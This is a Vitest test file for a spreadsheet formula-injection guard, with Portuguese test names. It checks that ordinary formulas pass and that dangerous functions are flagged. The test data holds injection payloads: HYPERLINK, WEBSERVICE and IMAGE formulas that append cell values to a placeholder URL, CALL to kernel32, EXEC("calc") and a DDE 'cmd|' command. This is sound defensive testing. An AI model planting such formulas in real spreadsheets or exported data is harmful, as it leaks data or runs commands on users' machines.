import { describe, expect, it } from "vitest";
import { findDangerousFormulaFunctions, isFormulaCell } from "./formula-guard.js";

describe("findDangerousFormulaFunctions", () => {
	it.each(["SUM(A1:A3)", "IF(A1>1,VLOOKUP(B1,C:D,2,0),0)", "A1*2", 'IF(A1="HYPERLINK(x)",1,2)', "SUMIF(A:A,\"IMAGE(\",B:B)"])("fórmula comum passa: %s", (f) => {
		expect(findDangerousFormulaFunctions(f)).toEqual([]);
	});
	it.each([
		['HYPERLINK("http://x/?"&A1,"ok")', "HYPERLINK"],
		['WEBSERVICE("http://x/"&A1)', "WEBSERVICE"],
		['importxml("http://x","//a")', "IMPORTXML"],
		['IMPORTDATA("http://x")', "IMPORTDATA"],
		['IMPORTHTML("http://x","table",1)', "IMPORTHTML"],
		['IMPORTRANGE("id","A1")', "IMPORTRANGE"],
		['IMAGE("http://x/"&A1)', "IMAGE"],
		['FILTERXML(A1,"//a")', "FILTERXML"],
		['CALL("kernel32","x")', "CALL"],
		['REGISTER.ID("a","b")', "REGISTER.ID"],
		['EXEC ("calc")', "EXEC"],
		['_xlfn.WEBSERVICE("http://x")', "WEBSERVICE"],
		['SUM(1)+HYPERLINK("http://x")', "HYPERLINK"],
	])("recusa %s", (f, name) => {
		expect(findDangerousFormulaFunctions(f)).toContain(name);
	});
	it("recusa invocação DDE cmd|", () => {
		expect(findDangerousFormulaFunctions("cmd|' /C calc'!A0")).toHaveLength(1);
	});
});

describe("isFormulaCell", () => {
	it("só texto com = e algo depois", () => {
		expect(isFormulaCell("=A1")).toBe(true);
		expect(isFormulaCell("=")).toBe(false);
		expect(isFormulaCell(5)).toBe(false);
	});
});
